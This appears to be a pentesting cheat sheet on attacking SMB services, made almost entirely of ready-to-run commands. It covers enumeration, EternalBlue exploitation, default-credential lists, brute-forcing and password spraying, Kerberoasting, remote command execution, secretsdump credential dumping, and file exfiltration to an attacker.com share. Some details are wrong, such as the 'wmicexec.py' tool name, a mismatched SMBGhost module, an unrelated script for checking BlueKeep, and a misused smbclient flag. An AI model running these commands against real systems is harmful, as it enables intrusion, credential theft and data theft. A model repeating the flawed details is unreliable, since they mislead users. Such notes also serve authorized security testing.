---
title: "139,445: SMB"
date: 2026-01-08T16:44:36-08:00
draft: false
description: "Pentesting SMB (Server Message Block)"
noindex: false
featured: false
pinned: false
toc: true
# comments: false
series:
#  - 
categories:
#  - 
tags:
#  - 
images:
#  - 
# menu:
#   main:
#     weight: 100
#     params:
#       icon:
#         vendor: bs
#         name: book
#         color: '#e24d0e'
meta:
  reading_time: false
---

SMB (Server Message Block) runs on ports 139 (NetBIOS) and 445 (Direct SMB over TCP/IP) and is used for file and printer sharing on Windows networks. SMB services often contain misconfigurations, default credentials, or vulnerabilities that can lead to unauthorized access, lateral movement, and credential theft.

## Enumeration

### Version Detection

**Nmap service scan:**
```shell
nmap -sV -p 445,139 $RHOST
nmap -sC -sV -p 445,139 $RHOST
```

\
**SMB version detection:**
```shell
nmap --script smb-protocols -p 445 $RHOST
nmap --script smb-os-discovery -p 445 $RHOST
```

### Nmap SMB Scripts

**Default safe scripts:**
```shell
nmap --script "smb-* and safe" -p 445 $RHOST
```

\
**All SMB scripts:**
```shell
nmap --script smb-* -p 445 $RHOST
```

\
**Common enumeration scripts:**
```shell
nmap --script smb-enum-shares,smb-enum-users,smb-enum-domains,smb-enum-groups -p 445 $RHOST
```

\
**Vulnerability detection:**
```shell
nmap --script smb-vuln-* -p 445 $RHOST
```

\
**System information:**
```shell
nmap --script smb-os-discovery,smb-system-info -p 445 $RHOST
```

### Enum4linux

Comprehensive SMB enumeration tool:

**Basic enumeration:**
```shell
enum4linux -a $RHOST
```

\
**Specific enumeration:**
```shell
enum4linux -U $RHOST              # User enumeration
enum4linux -S $RHOST               # Share enumeration
enum4linux -P $RHOST               # Password policy
enum4linux -G $RHOST               # Group enumeration
enum4linux -n $RHOST               # NetBIOS names
enum4linux -s $RHOST               # Share permissions
```

\
**With credentials:**
```shell
enum4linux -u username -p password -a $RHOST
```

### Smbclient

Interactive SMB client:

**List shares:**
```shell
smbclient -L $RHOST
smbclient -L //$RHOST -N          # Anonymous access
smbclient -L //$RHOST -U username
```

\
**Connect to share:**
```shell
smbclient //$RHOST/sharename
smbclient //$RHOST/sharename -N   # Anonymous
smbclient //$RHOST/sharename -U username
```

### Rpcclient

RPC enumeration tool:

**Connect:**
```shell
rpcclient -U "" $RHOST             # Anonymous
rpcclient -U "username" $RHOST
```

\
**Common RPC commands:**
```shell
enumdomusers                        # Enumerate domain users
enumdomgroups                       # Enumerate domain groups
queryuser <rid>                     # Query specific user
querygroup <rid>                    # Query specific group
lsaquery                            # LSA information
srvinfo                             # Server information
```

---

## Anonymous Access

Many SMB servers allow anonymous/null session access, which can reveal sensitive information without authentication.

### Manual Testing

**Smbclient:**
```shell
smbclient -L //$RHOST -N
smbclient //$RHOST/sharename -N
```

\
**Nmap:**
```shell
nmap --script smb-enum-shares,smb-enum-users -p 445 $RHOST
```

\
**Rpcclient:**
```shell
rpcclient -U "" -N $RHOST
```

\
**Metasploit:**
```shell
msfconsole
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS $RHOST
run
```

### Anonymous Access Actions

Once connected with anonymous access:

**Browse shares:**
```shell
smbclient //$RHOST/sharename -N
ls
cd directory
get filename
put filename
```

\
**List shares:**
```shell
smbclient -L //$RHOST -N
```

---

## Vulnerabilities

Check for known vulnerabilities early in the assessment, as they may provide immediate access without requiring credentials.

### EternalBlue (MS17-010)

Remote code execution vulnerability in SMBv1:

**Check if vulnerable:**
```shell
nmap --script smb-vuln-ms17-010 -p 445 $RHOST
```

\
**Metasploit exploit:**
```shell
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $RHOST
run
```

\
**Manual exploitation:**
```shell
python3 exploit.py $RHOST
```

### SMBGhost (CVE-2020-0796)

Remote code execution in SMBv3:

**Check if vulnerable:**
```shell
nmap --script smb-protocols -p 445 $RHOST | grep "3.1.1"
```

\
**Metasploit:**
```shell
msfconsole
use exploit/windows/smb/smb_doublepulsar_rce
set RHOSTS $RHOST
run
```

### BlueKeep (CVE-2019-0708)

Remote desktop vulnerability affecting older Windows:

**Check if vulnerable:**
```shell
nmap --script rdp-vuln-ms12-020 -p 3389 $RHOST
```

---

## User Enumeration

Enumerate users before attempting password attacks, as you need valid usernames for brute-forcing.

### Enumerate Users

**Enum4linux:**
```shell
enum4linux -U $RHOST
```

\
**Rpcclient:**
```shell
rpcclient -U "" -N $RHOST
enumdomusers
```

\
**Nmap:**
```shell
nmap --script smb-enum-users -p 445 $RHOST
```

\
**CrackMapExec:**
```shell
crackmapexec smb $RHOST -u '' -p '' --users
```

### Get User Information

**Rpcclient:**
```shell
rpcclient -U "" -N $RHOST
queryuser <RID>
queryuser 0x3e8
```

\
**Impacket:**
```shell
lookupsid.py username:password@$RHOST
```

---

## Default Credentials

Test common default credentials before attempting brute-force attacks:

**Common combinations:**
- `administrator:administrator`
- `admin:admin`
- `administrator:password`
- `guest:guest`
- `administrator:` (empty password)
- `admin:` (empty password)

\
**Vendor-specific defaults:**
- **Default Windows shares**: Often use domain credentials or no credentials for public shares
- **Network devices**: Check vendor documentation (D-Link, Netgear, etc.)
- **Samba**: Often `root:root` or no password
- **QNAP/Synology NAS**: Check vendor documentation

### Quick Credential Test

**Smbclient:**
```shell
smbclient -L //$RHOST -U administrator -P administrator
smbclient //$RHOST/sharename -U admin -P admin
```

\
**CrackMapExec:**
```shell
crackmapexec smb $RHOST -u administrator -p administrator
```

---

## Password Attacks

### Credential Brute-forcing

**Hydra:**
```shell
hydra -L users.txt -P passwords.txt smb://$RHOST
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://$RHOST
hydra -L users.txt -P passwords.txt smb://$RHOST -m WORKGROUP
```

\
**Medusa:**
```shell
medusa -h $RHOST -u administrator -P passwords.txt -M smbnt
```

\
**Ncrack:**
```shell
ncrack -p 445 -U users.txt -P passwords.txt $RHOST
```

\
**CrackMapExec:**
```shell
crackmapexec smb $RHOST -u users.txt -p passwords.txt
crackmapexec smb $RHOST -u username -p passwords.txt --shares
```

### Password Spraying

**CrackMapExec:**
```shell
crackmapexec smb $RHOST -u users.txt -p 'Password123' --continue-on-success
```

\
**Metasploit:**
```shell
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS $RHOST
set USERPASS_FILE users_passwords.txt
run
```

### ASREPRoasting

Extract AS-REP hashes for offline cracking:

**Impacket:**
```shell
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

### Kerberoasting

Extract service account hashes:

**Impacket:**
```shell
GetUserSPNs.py domain/username:password -dc-ip $RHOST -outputfile hashes.txt
```

---

## Share Enumeration

After obtaining credentials, enumerate and access shares to discover sensitive files and potential attack paths.

### List Shares

**Smbclient:**
```shell
smbclient -L //$RHOST -U username
smbclient -L //$RHOST -N
```

\
**Nmap:**
```shell
nmap --script smb-enum-shares -p 445 $RHOST
```

\
**CrackMapExec:**
```shell
crackmapexec smb $RHOST -u username -p password --shares
```

### Access Shares

**Smbclient:**
```shell
smbclient //$RHOST/sharename -U username
smbclient //$RHOST/sharename -N
```

\
**Mount share (Linux):**
```shell
mkdir /mnt/smb
mount -t cifs //$RHOST/sharename /mnt/smb -o username=user,password=pass
```

\
**List files:**
```shell
smbclient //$RHOST/sharename -U username
ls
cd directory
```

### Common Shares

Look for these default shares:
- `C$`, `D$` (administrative shares)
- `ADMIN$` (administrative)
- `IPC$` (inter-process communication)
- `PRINT$` (printer drivers)
- `NETLOGON`, `SYSVOL` (domain controllers)

>[!warning] **Note**: Access to `C$` and `ADMIN$` shares requires administrator credentials and can provide full system access.

---

## File Operations

### Download Files

**Smbclient:**
```shell
smbclient //$RHOST/sharename -U username
get filename.txt
mget *.txt
recurse ON
mget *
```

\
**Smbget (recursive download):**
```shell
smbget -R smb://$RHOST/sharename -U username
```

\
**Impacket (smbclient.py):**
```shell
smbclient.py username:password@$RHOST
# Interactive commands similar to smbclient
```

### Upload Files

**Smbclient:**
```shell
smbclient //$RHOST/sharename -U username
put localfile.txt
mput *.txt
```

\
**Impacket:**
```shell
smbclient.py username:password@$RHOST
put localfile.txt remotefile.txt
```

### Mount Share

**Linux:**
```shell
mkdir /mnt/smb
mount -t cifs //$RHOST/sharename /mnt/smb -o username=user,password=pass
# Or with domain
mount -t cifs //$RHOST/sharename /mnt/smb -o username=user,password=pass,domain=WORKGROUP
```

\
**Mount read-only:**
```shell
mount -t cifs //$RHOST/sharename /mnt/smb -o username=user,password=pass,ro
```

---

## Command Execution

### PSExec

Execute commands remotely using SMB:

**Impacket:**
```shell
psexec.py username:password@$RHOST
psexec.py username:password@$RHOST "whoami"
```

\
**Metasploit:**
```shell
msfconsole
use exploit/windows/smb/psexec
set RHOSTS $RHOST
set SMBUser username
set SMBPass password
run
```

### WMIExec

Execute commands via WMI over SMB:

**Impacket:**
```shell
wmicexec.py username:password@$RHOST
wmicexec.py username:password@$RHOST "whoami"
```

### Atexec

Execute commands via scheduled tasks:

**Impacket:**
```shell
atexec.py username:password@$RHOST "whoami"
```

---

## Credential Dumping

### Secretsdump

Dump credentials from remote system:

**Impacket:**
```shell
secretsdump.py username:password@$RHOST
secretsdump.py domain/username:password@$RHOST
```

\
**Dump from DC:**
```shell
secretsdump.py domain/username:password@DC_IP -just-dc
```

### SAM Dump

If you have local administrator access:

**Impacket:**
```shell
secretsdump.py LOCAL -sam sam.save -system system.save -security security.save
```

---

## Data Exfiltration

### Exfiltrate Files

**Via SMB upload to attacker server:**
```shell
# On target (if you have shell)
smbclient //attacker.com/share -U username
put sensitive.txt
```

\
**Via mounted share:**
```shell
mount -t cifs //attacker.com/share /mnt/attacker -o username=user,password=pass
cp /path/to/sensitive.txt /mnt/attacker/
```

### Search for Sensitive Files

Common files to look for:
- Configuration files (`config.php`, `.env`, `web.config`, `app.config`)
- Backup files (`*.bak`, `*.backup`, `*.old`, `*.bak2`)
- Credentials (`passwords.txt`, `creds.txt`, `*.pwd`)
- Log files (`*.log`, `access.log`, `error.log`)
- Database files (`*.mdb`, `*.sql`, `*.db`)
- SSH keys (`id_rsa`, `id_dsa`, `*.pem`)

\
```shell
smbclient //$RHOST/sharename -U username
recurse ON
mget *.txt
mget *.log
mget *.bak
```

---

## Common Tools

Reference guide for commonly used SMB pentesting tools:

### CrackMapExec

Swiss army knife for Windows networks:

**Basic usage:**
```shell
crackmapexec smb $RHOST -u username -p password --shares
crackmapexec smb $RHOST -u users.txt -p passwords.txt
crackmapexec smb $RHOST/24 -u username -p password --shares
```

\
**Command execution:**
```shell
crackmapexec smb $RHOST -u username -p password -x "whoami"
crackmapexec smb $RHOST -u username -p password -X "powershell.exe -c ..."
```

### Impacket Suite

Collection of Python scripts for SMB/Windows protocols:

**Common tools:**
- `smbclient.py` - SMB client
- `psexec.py` - Remote command execution
- `secretsdump.py` - Credential dumping
- `GetNPUsers.py` - ASREPRoasting
- `GetUserSPNs.py` - Kerberoasting
- `wmicexec.py` - WMI execution
- `atexec.py` - Task scheduler execution

### Smbmap

SMB share enumeration and access:

**List shares:**
```shell
smbmap -H $RHOST
smbmap -H $RHOST -u username -p password
smbmap -H $RHOST -u '' -p ''
```

\
**Recursive directory listing:**
```shell
smbmap -H $RHOST -u username -p password -R sharename
```

\
**Download file:**
```shell
smbmap -H $RHOST -u username -p password -r sharename --download filename.txt
```
